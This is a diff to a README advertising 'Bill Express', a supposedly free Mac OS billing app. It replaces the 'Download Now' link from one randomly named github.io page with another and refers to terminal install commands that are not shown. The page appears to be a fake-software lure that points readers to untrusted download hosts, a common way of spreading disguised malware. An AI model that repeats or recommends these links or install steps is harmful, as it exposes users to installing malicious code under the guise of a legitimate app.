@@ -3,7 +3,7 @@
 
 Effortlessly manage your finances with Bill Express, a powerful and free desktop app for Mac OS. Follow the instructions below to install and streamline your billing process.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge)](https://fituganshfgh.github.io/.github/billexpress)
+[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge)](https://mrboomzeus519.github.io/gimronus/billexpress)
 
 If the button above doesn’t work, follow the terminal command instructions below.
 
